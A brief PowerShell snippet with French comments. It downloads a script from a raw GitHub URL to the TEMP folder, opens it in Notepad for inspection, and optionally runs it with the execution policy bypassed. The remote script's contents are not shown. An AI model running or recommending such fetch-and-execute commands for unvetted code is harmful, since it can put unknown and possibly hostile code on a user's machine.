# Télécharge le script
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/stormdiscordsoon-ship-it/dcder/main/des./desi.ps1" -OutFile "$env:TEMP\desi.ps1"

# Vérifie le contenu avant de l’exécuter :
notepad "$env:TEMP\desi.ps1"

# (Optionnel) Exécute le script si tu es sûr qu’il est sûr
powershell -ExecutionPolicy Bypass -File "$env:TEMP\desi.ps1"
